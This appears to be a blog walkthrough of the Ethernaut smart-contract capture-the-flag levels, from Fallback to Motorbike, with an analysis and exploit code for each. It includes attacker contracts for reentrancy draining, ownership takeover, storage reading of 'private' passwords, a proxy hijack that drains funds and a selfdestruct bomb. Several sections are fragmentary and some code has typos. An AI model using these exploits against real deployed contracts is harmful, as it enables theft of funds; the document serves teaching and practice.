Pretty simple we send ether and it's recorded for us.\n\n![fallback method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf_hox5ei.png)  \n\nOkay the **receive** part. As we see here we are defining a function but without the *function* keyword. That's because the receive function is a *fallback* function, let's say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.\nActually, since the version 0.6.0 we got two functions to handle fallback cases. *fallback* and *receive*. a little explainer of how they are called ...\n\n```js\n// Explainer from: https://solidity-by-example.org/fallback/\n    // Ether is sent to contract\n    //      is msg.data empty?\n    //          /   \\ \n    //         yes  no\n    //         /     \\\n    //    receive()?  fallback() \n    //     /   \\ \n    //   yes   no\n    //  /        \\\n    //receive()  fallback()\n```\n\nSo what we need to do here actually ?\n\n1. Contribute so we have a contribution **value non nul**.\n2. Trigger the fallback function by sending ether to the contract.\n\n-----\n**Exploitation**\n\n```js\nawait contract.contribute({value:toWei(etherValue)});\nawait contract.sendTransaction({value:toWei(etherValue)});\n```\n\nChallenge solved ✅\n\n## Fallout\n\nConstructors in solidity are quite a story and they were the source of a big -----\n**Exploitation**.\nHere the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal **public** function that we can call to get the contract ownership.\n\n```js\nawait contract.Fal1out();\n```\n\n## CoinFlip\n\n`Randomness is just a myth.`\n\n**Challenge description**\n\nYou'll need to use your psychic abilities to guess the correct outcome 10 times in a row.\n\n--------\n**Analysis** \n\nIn blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an deterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible.\n\nHere we see the function of coinFlip\n![CoinFlip method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b_czfni3.png)  \n\nour seed is actually `block.number` but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈\n\n-----\n**Exploitation** \n\n![CoinFlip Attack](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a_saizwt.png)  \n\nNow all we have to do is call the contract method 10 times.\n\n## Telephone\n\n**Challenge description**\n\n- Claim ownership of the contract.\n\n--------\n**Analysis**\n\n![Telephone method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f_xqkdnr.png)  \n\nHere we see the condition being checked is as simple as `tx.origin != msg.sender` but what does `tx.origin` means ?\nActually `tx` is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.\nWhen we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the `tx.origin == caller.address` \n\n-----\n**Exploitation**\n\nBased on our analysis we understand all we need is to call the function from an evil contract and pass our address as parameter.\n\n```js\ninterface TelephoneInterface{ \n    function changeOwner(address _owner) external; \n}\n\ncontract EvilContract { \n    \n    TelephoneInterface victimContract;\n    contructor(address victimAddress) public {\n        victimContract = TelephoneInterface(victimAddress);\n    }\n\n    function becomeOwner(address newOwner){\n        victimContract.changeOwner(newOwner);\n    }\n}\n```\n\nChallenge solved ✅\n\n## Token\n\n--------\n**Analysis**\n\nThis challenge is about **unsigned integers**. We need to be extra duper careful when handling them as they *overlap*. What does that mean ? \n\n```c#\nuint8 X= 255;\nX=X+1 // X = 0 ;\n```\nNow you see it.\n\n![Token method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a_df2hde.png)  \n\n```js\n require(balances[msg.sender] - _value >= 0); // How about we pass a big value to this poor unsigned balances[msg.sender] ?\n```\n\n-----\n**Exploitation**\n\nWe got 20 tokens, So I will be generous and give more than I own.\n\n```js\n await contract.transfer(player,21);\n```\n\nChallenge solved ✅\n\n## Delegation\n\n**Challenge description**\n\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n--------\n**Analysis** \n\nHere we are exposed to the `delegateCall` function. If you don't know what this function does I will try to sum it up. It's a low level way to call a method of a contract ( in our case `pwn` ) in the context of another, it means it gets the storage values and global ones of the contract who called `delegateCall`.\n\n![Delegation pwn](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc_m6k8pd.png)  \n\n![Delegation fallback](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138019/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a_vpu7ji.png)  \n\nOkay so what is *msg.data* ?\nmsg.data can be the function selector with the parameters in a bytes encoded format\n\n-----\n**Exploitation**\n\nI wrote a contract to get the bytes, we can also use `web3.eth.abi.encodeFunctionCall` from the console.\n\n```js\ncontract Utility {\n     function pwnEncoded () public pure returns (bytes memory) {\n      return abi.encodeWithSignature(\"pwn()\"); \n    }\n```\n\n```js\nawait contract.sendTransaction({data:valueFromContract});\n```\nChallenge solved ✅\n\n## Force\n\nWe will learn another capability of smart contracts which sometimes became problematic if we rely on it.\n\n**Challenge description**\n\nThe goal of this level is to make the balance of the contract greater than zero.\n\n--------\n**Analysis**\n\nNothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.\n\n[Link for more informations](https://docs.soliditylang.org/en/develop/security-considerations.html)\n\nSo what is the method to send ethers to an empty contract or let's say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it's the method `selfdestruct(address)`\n\n> The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state\n\n[Docs Link](https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct)\n\nWe got everything we need now let's hack !\n\n-----\n**Exploitation**\n\n```js\ncontract EvilContract { \n    // payable public so we can send it some ether to pass.\n    function forceSendBySacrifice(address victimAddress) payable public {\n        selfdestruct(_address);\n\n    }\n}\n```\n\n## Vault\n\n`transparency has no limits`\n\n**Challenge description**\n\nUnlock the vault to pass the level!\n\n--------\n**Analysis**\n\n![Vault storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a_auuwqt.png)  \n![Vault method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee_somrgz.png)  \n\nThe private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can't be viewed or accessed by other **contracts** logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.\n\nHere we can see got two storage variables `locked` and `password`. I highly encouraging reading the docs [Storage solidity Docs](https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage) to understand how these variables are layed out.\n\nbytes32 will take a whole slot so it can share the slot with locked. We will have then :\n\n*slot0*  `locked`\n*solt1*  `password`\n\n-----\n**Exploitation**\n\n```js\n const password = await web3.eth.getStorageAt(address, 1);\n await contract.unlock()\n```\n\nChallenge solved ✅\n\n## King\n\n**Challenge description**\n\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.\n\n--------\n**Analysis**\n\n![King method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138016/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c_x8mhfi.png)  \n\nPretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?\nIf we go back to the `fallback` challenge we talked about *fallback* methods. Here when we call `transfer` a callback function of the contract to whom we are transferring funds to will be triggered.\n\n-----\n**Exploitation**\n\n1. Make our contract the king.\n2. Our contract now revert the transaction and won't step down from the throne 😈.\n\n```js\ncontract EvilContract { \n\n    function becomeKing(address victimAddress) public payable { \n        victimAddress.call{value:1000000000000000000}(\"\");\n    }\n\n    function() external payable { // fallback function definition\n        revert(\"The kingdom is mine now !\");\n    }\n}\n```\n\nChallenge solved ✅\n\n## Re-entrancy\n\n**Challenge description**\n\nThe goal of this level is for you to steal all the funds from the contract.\n\n--------\n**Analysis**\n\nA quick read about Re-entrancy attack is all we need: [HackerNoon Article](https://hackernoon.com/hack-solidity-reentrancy-attack).\n\n![Reentrancy method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138011/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c_ztdmmm.png)  \n\nSo he is actually our balance after the call that's all we need !\n\n-----\n**Exploitation** \n\n```js\ninterface Reentrance {\n\n    function donate(address _to) external payable;\n    function withdraw(uint amount) public;\n}\n\ncontract EvilContract {\n    Reentrance victimContract;\n    address victimAddress;\n    uint donatedValue;\n\n    constructor(address _victimAddress) public payable {\n        // Set our victim contract, fund the contract.\n        victimContract = Reentrance(_victimAddress);\n        victimAddress= _victimAddress\n    }\n\n    function attack(uint _donatedValue) public {\n        victimContract.donate.value(address(this),{value:_donatedValue});\n        victimContract.withdraw(_donatedValue);\n        donatedValue=_donatedValue\n    }\n\n    function() public payable {\n        // Receiver for funds withdrawn by the attack\n            if(victimAddress.balance>= donatedValue )\n            victimContract.withdraw(msg.value);\n        }\n}\n```\n\nNow we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep it to multipliers of 10 and so on.\n\nChallenge solved ✅\n\n## Elevator\n\n`with trust, everyone can get to the last floor`\n\n**Challenge description**\n\nThis elevator won't let you reach the top of your building. Right?\n\n--------\n**Analysis**\n\n![Elevator method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851_rpolcp.png)  \nThis function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :\n\n1. `Elevator` contract has no control over the logic of the `Building` contract.\n2. The `goTo` function is actually `public` which makes it possible to have some state changes inside it.\n\nAnd all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top.\n\n-----\n**Exploitation**\n\n```js\ninterface Elevator { \n function goTo(uint _floor) external;\n}\n\ncontract EvilBuilding { \n    uint count= 0; \n    function isLastFloor(uint) external returns (bool){ \n        count ++ ; \n        return count%2==0 ? true : false; // The first time will pass false the second true\n    }\n\n    function callAttack(address ElevatorAddress) public {\n        Elevator elevatorContract = Elevator(ElevatorAddress);\n        elevator.goTo(10); // put any number here really\n    }\n}\n```\n\nChallenge solved ✅\n\n## Privacy\n\n**Challenge description**\n\nThe creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\n\n--------\n**Analysis**\n\n![Privacy storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e_sfqspe.png)  \n\nAs we said before, every variable in the storage can be accessed all we have to do is find which slot it's residing in. Same applies here.\n\nWe got the following:\n\n```js\n// [0] bool locked\n// [1] uint256 ID\n// [2]      awkwardness | denomination | flattening\n// arrays start always in a new slot \n// [3] bytes32 data[0]\n// [4] bytes32 data[1]\n// [5] bytes32 data[2]\n```\n\n-----\n**Exploitation**\n\nWe know the position of the password . We can unlock the contract. \n\n```js\nawait contract.getStorageAt(INSTANCE_ADDRESS,5);\n/// We can manually extract the least significant 16 bytes or simply write a util contract like below\n```\n\n```js\ncontract Utils { \n    function get16Bytes(bytes32 value) public returns (bytes16) {\n        return bytes16(value);\n    }\n}\n```\n\n```js\nawait contract.unlock(Returned_Value);\n```\n\nChallenge solved ✅\n\n## Gatekeeper One\n\nThis challenge gave me hard time, two days to solve it but I learnt a lot during those days.\n\n**Challenge description**\n\nMake it past the gatekeeper and register as an entrant to pass this level.\n\n--------\n**Analysis**\n\nOkay so we got three modifiers, each one represents a `barrier` we need to break through. I will be going through each modifier one by one.\n\n#### gateOne\n\nLooking to this gate it sounds really familiar\n\n![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e_eyyyd2.png)  \n\nIt implies that we should be using another contract to interact with the gate.\n\n#### gateThree\n\nI will leave gateTwo the last one as it's the most annoying ( not hard ) one to pass.\n\n![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a_bg3gdk.png)  \n\nWe got three conditions to pass and lot of type conversion 🙂.It's time we learn how conversions works in solidity [Solidity Type conversions](https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions)\n\nLet's go through each condition one by one\n\n1. First condition\n\n```js\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n```\n\nLet's say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have \n\n*uint16 == uint32* which translates to 0x0000AAAA== 0xAAAA. => uint64(_gateKey) = 0x????????0000AAAA\n\n2. Second Condition\n\n```js\nrequire(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n```\n\n**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the `?` are different than zeros.\n\n3. Last condition\n\n```js\nrequire(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n```\n\nIt just tells us that the `AAAAA` should be derived from the `tx.origin` value.\n\nOkay to sum it up we have the format of `0xFFFFFFFF0000FFFF` for our contract. so we can get the values by using a logical operator `&`.\n\n#### gateTwo\n\n![Gateekeeper gateTwo](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf_f9rwex.png)  \n\nwhat is the `gasleft` function ?\nthe gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?\nwe can check the website [Opcodes, EVM](https://www.ethervm.io/), actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.\n\n-----\n\n**Exploitation**\n\n1. We should call the contract from our `Evil Contract` so we bypass the first gate\n2. We should make sure the key adhere to the key format we found.\n3. We need to pass a gas value that passes the condition.\n    > However when searching for that gas value we can\n        1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)\n        2. Use the debugger to check the gas value at the condition check.\n        3. Just don't, if you are impatient brute force it.

Actually, this `consensys` which a great resource for smart contract security explains it all .\n\n> the idea is straightforward: if an address contains code, it's not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.\n\n[Consensys Page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)\n\nSo we now know to pass this gate we need to call the method `enter` in the constructor of our *EvilContract*\n\n### gateThree\n\nThis gate resembles gateThree of *GateKeeper One* it's about performing the right logical operations and finding the gateKey.\n\n```js\n modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n    _;\n  }\n```\n\nLet's evalulate the *right* side of the equality. Remember the *Token* Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value `0xFFFFFFFF`.\nFor the *left* side of the equality we got an **XOR** operation. **XOR** verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let's ignore the conversion it won't change anything actually because we can reverse it to get the _gateKey later.\n\nSo the equation we have : \n\n**A** =  `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n**B** = `uint64(_gateKey)`\n**C** = `uint64(0) - 1`\n\nHere is what we need to do !

I  will be writing some pseudo/solidity code for analogy.\n\n```js\n//\nfunction whatIsTheMeaningOfLife(){\n    return 42;\n}\n\n```\n\n`a contract that responds to whatIsTheMeaningOfLife()` fallback function can answer that so let's make things more simple\n\n```js\nfunction(){\n    return 42;\n}\n```\n\nLet's translate it line by line to opcode. I found this magnificent reference [EtherVM](https://www.ethervm.io/#02). I really like the table view instead of navigating page by page through the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf).\n\n```js\nreturn 42; \n---------   \nPUSH1 0x42 //  our value\nPUSH1 0x80 //  memory position\nMSTORE // stores the 42 into memory location 0x80\nPUSH1 0x20 // the length of the value\nPUSH1 0x80 // memory position ( again )\nRETURN // returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !\n\n// *10 bytes total*\n```\n\n`PUSH1 VALUE` pushes a 1-byte value onto the stack.\n`MSTORE` writes a (u)int256 to memory takes (offset,value) as args\n\n> The ethereum evm is a [Stack Machine](https://en.wikipedia.org/wiki/Stack_machine). args comes from the stack and return values are written into the stack.\n\n> In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use [A deep-dive into Solidity – contract creation and the init code](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/)\n\nNow we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two *initialization opcodes* and *runtime opcodes*. The *initialization opcodes* are the one responsible for the creation of the contract by executing the constructor and copying the *runtime opcodes* into the memory because the *runtime opcodes* is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the *runtime opcodes*. Let's define our *initilization opcodes*\n\n```js\n// copy the runtime code into memory with codecopy(length,offset,dest)\nPUSH 0x0a // 10 bytes of runtime opcodes\nPUSH 0x0c // 13 bytes of initialization opcodes ( I didn't guess it I have actually calculated after writing the whole thing )\nPUSH 0x00 // memory offset\nCODECOPY\n\n// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code\nPUSH 0x0a \nPUSH 0x00\nRETURN\n```\n\n-----\n**Exploitation**\n\nTo craft our payload we will convert the instruction to pure bytes. That's fairly easy. We view [EtherVM](https://www.ethervm.io/#02) to view the bytes of each instruction and for the values we discard the `0x` (`0x0a` => `0a`)\n\n                       [ Initialization bytes    |    Runtime bytes ]\nSo our final payload : `600a600c600039600a6000f3604260805260206080f3`\n\nWe open the console to create our contract and set it as the solver.\n\n```js\nconst tx = await web3.eth.sendTransaction({from:player,data:'600a600c600039600a6000f3604260805260206080f3'});\nawait contract.setSolver(tx.contractAddress);\n```\n\nChallenge solved ✅\n\n## Alien Codex\n\n**Challenge description**\n\nYou've uncovered an Alien contract.

The Ownable contract is actually `openzeppelin` Ownable and I looked into its source code and the only useful thing I got is it saves `address owner`.\n\n Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack.

If we make the length of the array takes up the whole storage then we can overwrite any value of it. `retract` allows that, the `array.length` is `uint256`. \n\nAfter taking up the whole storage we need to find the position of the owner variable.\nOur current storage layout is.\n\n```js\n/* STORAGE\n* [0]: contract + owner , \n* [1]: codex\n* keccak256(1) : codex[0]\n*       ..\n*        ..\n* [2^256]: 0x000000000\n*/\n```\n\nWe want to overlap and get to slot[0] to set it.

For example call.gas(100000).value().\n\nTypically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.\n\nNote: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.\n\n\n## Shop\n\n```js\ninterface Shop {\n\n  function buy()  external ;\n  function isSold()  external view returns (bool) ;\n  }\n\ncontract EvilContract { \n    address victimAddress;\n    Shop shopContract;\n\n    function setVictimAddress( address _victimAddress) public { \n        victimAddress= _victimAddress;\n        shopContract = Shop(_victimAddress);\n    }\n\n    function price() external view returns (uint){\n        return shopContract.isSold()?0:100;\n    }\n\n    function buy() public {\n        shopContract.buy();\n    }\n}\n```\n\n## Dex\n\n`This challenge and it's second version will have the same solution basically with a little tweak.

The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\n> Little did they know, their lunch money was at risk…\n  You'll need to hijack this wallet to become the admin of the proxy.\n  Things that might help::\n    Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.\n    Knowing about proxy patterns and the way they handle storage variables.\n\n--------\n**Analysis**\n\nWe all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that's why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts\n\n```js\ncontract PuzzleProxy is UpgradeableProxy {\n    // Getting to know the storage's layout of our contract\n    address public pendingAdmin;\n    address public admin;\n    ...\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    ...\n\n    contract PuzzleWallet {\n        // PuzzleWallet storage's layout\n    using SafeMath for uint256;\n    address public owner;\n    ...\n\n        modifier onlyWhitelisted {\n           require(whitelisted[msg.sender], \"Not whitelisted\");\n            _;\n        }\n\n      // Can change the storage slot[1]\n      function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      // contract's balance should be 0, but wait how much is it now ? \n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      ...\n\n      // only owner can add to white list\n      function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        ...\n\n        // You should be in whitelisted to be here\n        function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n            ...\n            assembly {\n                // for more low level ops\n                selector := mload(add(_data, 32))\n            }\n            ...\n            // deposit can only be called once \n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            ...\n            // To not mistake it for the normal contract to contract delegate let's call it selfDelegate.\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n\n\n```\n\nFollowing the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.\n\n```js\n  let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n```\n\nOkay let's sum it up in a diagram.\n\n![PuzzleWallet diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc_e13u24.png)  \n\ndelegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let's inspect the storage layout for both contracts.\n\n![PuzzleWallet storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138027/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e_t0ouln.png)  \n\n`owner` and `pendingAdmin` both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we `puzzleWalletAddress.delegateCall` we became the owner of the puzzleWallet contract ! huuuge.\n\nWe will be using the `proposeNewAdmin` to set the `pendingAdmin` value.\n\nOkay so now we can execute `owner` functions. Let's not forget our goal is to become the `owner` of the *Proxy* contract. Let's look for the function that can set `slot[1]` of the storage in both contracts.\n\n```js\n function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      // contract's balance should be 0, but wait how much is it now ? \n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      ...\n }\n```\n\nSo first of all we need to be `whitelisted`. We can do that\n\n```js\nawait contract.addToWhitelist(player);\n```\n\nSecond we need to make the contract balance to 0. `await web3.eth.getBalance(instance)` will return **0.001** ethers as balance. The `execute` function won't allow such a thing as we can only withdraw what we did deposit (It's tracked in storage variable `balances`). The only way to drain funds is to have more `balance` than the amount we deposited.\n\nIf we can't call deposit multiple times in one `multicall` how about we do it but by adding another layer of `multicall`\n\n![PuzzleWallet call hiearchy](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d_ggsn87.png)  \n\nThis allows to have the double of the msg.value as balance. Okay so we said we had **0.001** ethers as contract balance ? let's deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract's ) . By having the contract's balance as 0 we can simply set the owner ow I mean maxBalance to our player account to **hijack the proxy**.\n\n-----\n**Exploitation**\n\n1. become the owner of the contract\n2. become whitelisted\n3. deposit the balance of the contract with multiple calls\n4. withdraw all funds\n5. setMaxBalance as our address\n\n> The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don't get confused the address is the proxy's !\n\n```js\nconst proposeAdminCall= web3.eth.abi.encodeFunctionCall({\nname: 'proposeNewAdmin',\n    type: 'function',\n    inputs: [\n        {\n            type: 'address',\n            name: '_newAdmin'\n        }\n    ]\n},player)\n\nawait web3.eth.sendTransaction({data:proposeAdminCall,from:player,to:instance});\n\nawait contract.addToWhitelist(player);\n\n// getting the deposit call data\n\nconst depositData = (await contract.methods('deposit()').request()).data\n\nconst multiCallData = (await contract.methods('multicall(bytes[])').request([depositData])).data\n\nawait contract.multicall([multicallData,multicallData],{value:toWei('0.001')}); // adding to our balance\n\nawait contract.execute(player,toWei('0.002'),'0x0'); // Draining funds\n\nawait contract.setMaxBalance(player) // It will convert upon call \n```\n\nChallenge solved ✅\n\n## Motorbike\n\n**Challenge description**\n\n> Ethernaut's motorbike has a brand new upgradeable engine design. \n>  Would you be able to selfdestruct its engine and make the motorbike unusable ?\n>Things that might help:\n    EIP-1967\n    UUPS upgradeable pattern\n    Initializable contract\n\n**Analysis**\n\nTo solve this challenge, we need to be familiar with both [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) and most importantly  the [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)\n\nAfter going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.\n\n![Motorbike Diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23_usrhte.png)  \n\nAfter drawing the diagram, I had many unanswered questions the most important one did we `initialize` the engine contract or not !\nI really know where the address of the *Engine* contract is in storage so I can check that !\n\n```js\nconst engineAddress = await web3.eth.getStorageAt(instance,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');\n\n// let's check the value\nawait web3.eth.call({to:engineAddress,from:player,data:web3.eth.abi.encodeFunctionSignature('upgrader()')})\n// returned 0x000000\n// the initialize() wasn't called and that's our -----\n**Exploitation** !\n```\n\n\n**Exploitation**\n\n1. initialize the *Engine* contract so we become the **upgrader**.\n2. upgrade our *Engine* contract to our bomb contract ( which will selfdestruct )\n3. call selfdestruct, the call will be done through *delegateCall* so the actual *Engine* will be destructed !\n\nour evil contract\n\n```js\ncontract BombEngine { \n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    function destruct() public {\n        selfdestruct( payable ( 0x84e7a3679A82C2766Ff8382862ab883FF9460307));\n    }\n}\n```\n\n```js\nconst destructData= web3.eth.abi.encodeFunctionSignature('destruct()');\n\nconst data= web3.eth.abi.encodeFunctionCall({\n    name: 'upgradeToAndCall',\n    type: 'function',\n    inputs: [{\n        type: 'address',\n        name: 'newImplementation'\n    },{\n        type: 'bytes',\n        name: 'data'\n    }]\n}, [bombEngineAddress,destructData]);\n\nawait web3.eth.sendTransaction({to:engineAddress,from:player,data:data})\n\n// You can do a random call to the Engine contract it will revert because it's gone !\n```\n\nChallenge solved ✅\n\n"}},"__N_SSG":true}
